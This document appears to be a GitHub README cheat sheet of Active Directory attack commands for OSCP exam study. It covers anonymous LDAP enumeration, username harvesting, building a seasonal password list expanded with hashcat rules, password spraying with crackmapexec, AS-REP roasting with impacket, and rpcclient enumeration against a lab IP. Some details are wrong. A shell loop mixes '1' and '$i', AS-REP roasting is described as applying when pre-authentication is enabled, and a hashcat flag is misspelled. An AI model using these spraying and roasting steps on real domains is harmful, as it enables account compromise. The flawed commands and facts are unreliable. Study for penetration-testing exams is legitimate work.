<div id="top"></div>

  <h3 align="center">Active Directory</h3>

  <p align="center">
    AD for OSCP exam
  </p>
</div>

<!-- ABOUT THE PROJECT -->
## General

<h4>LDAP</h4>

Even without a user account we can enumerate the domain if the LDAP port is open.

    ldapsearch -h 10.10.10.10 -x -s base namingcontexts | showes the DN
    OUTPUT:
    namingContexts: DC=whitehats,DC=local
    ...
    
    ldapsearch -h 10.10.10.10 -x -b "DC=whitehats,DC=local" | shows all domain information anonymous
    cat ldap-anonymous.out | grep -i memberof | find groups
    ldapsearch -h 10.10.10.10 -x -b "DC=whitehats,DC=local" '(objectClass=person)' | finds a user object

Prepare passwordspray:

    ldapsearch -h 10.10.10.10 -x -b "DC=whitehats,DC=local" '(objectClass=person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
    
We can remove some accounts from the list:
* Guest accounts
* Accounts ending with $ are machine accounts
* Generated exchange accounts (looking long and weird)

Creating custom password list:

    January
    February
    March
    April
    May
    June
    July
    Fall
    Spring
    Winter
    Summer
    Autumn
    P@ssw0rd
    Password
    ...
    
From custom list:

    for 1 in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
    
Hashcat can create some good list from this input:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule
    for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; done > with '!' 

For even more:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
    
Decrease password file:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 8'
    
Password spray with CME:

    crackmapexec smb 10.10.10.10 -u userfilepath -p usrpwdpath
    
<h4>Kerberoasting</h4>

ASREPROAST: when a user object has kerberos pre-authentication enabled.

GetNPUsers.py from impacket.

    /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.10 -request 'whitehats.local/'
    
If an account is ASREPROASTable we can also format the hash dumped to hashcat output.

    /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.10 -request 'whitehats.local/' -format hashcat
    
Crack it with hashcat:

First find what kind of krbasrep$23 number we have.

    hashcat --examples-hashes | grep -i krb


<h4>MSRPC</h4>

    rpcclient -U '' 10.10.10.10
    enumdomusers

Get more information about specific user:

    queryusergroups 0x47b <-- is the rid:
    queryuser rid

Get group:

    querygroup rid
    

<p align="right">(<a href="#top">back to top</a>)</p>
